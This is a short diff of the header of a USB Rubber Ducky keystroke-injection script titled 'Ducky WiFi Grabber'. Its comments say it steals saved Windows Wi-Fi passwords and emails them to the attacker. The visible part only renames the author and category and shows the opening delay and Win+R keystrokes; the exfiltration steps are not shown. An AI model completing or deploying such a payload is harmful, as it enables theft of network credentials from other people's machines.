@@ -1,7 +1,11 @@
-REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
-REM Description: Steals all of the saved Wifi Passwords and sends them via an outlook email.
-REM Version:	1.0
-REM Category:	Passwords
+REM Title:         Ducky WiFi Grabber
+REM Description:   Steals wifi passwords and sends them to your outlook email
+REM Author:        Zero_Sploit
+REM Props:         Hak5 Team
+REM Version:       1.0
+REM Category:      Exfiltration
+REM Target:        Windows 10 (CMD + Powershell)
+REM Attackmodes:   HID
 DEFAULT_DELAY 600
 DELAY 500
 WINDOWS r
